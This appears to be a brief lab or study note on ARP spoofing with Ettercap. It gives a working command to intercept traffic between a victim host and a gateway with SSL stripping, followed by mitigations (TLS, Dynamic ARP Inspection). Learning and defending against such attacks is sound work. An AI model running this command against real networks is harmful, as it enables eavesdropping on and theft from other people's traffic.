## ARP Spoofing & MITM – Ettercap

---

### 🎯 Objective
Intercept traffic between victim and gateway.

---

### 🧪 Command
```bash
sudo ettercap -T -M arp:remote /10.6.6.23/ /10.6.6.1/
```
* SSL-strip plugin enabled

---

### 📌 Mitigation
- Use TLS everywhere
- Enable Dynamic ARP Inspection on switches

---

### 📌 Take-Aways
ARP spoofing is trivial on unprotected LANs.
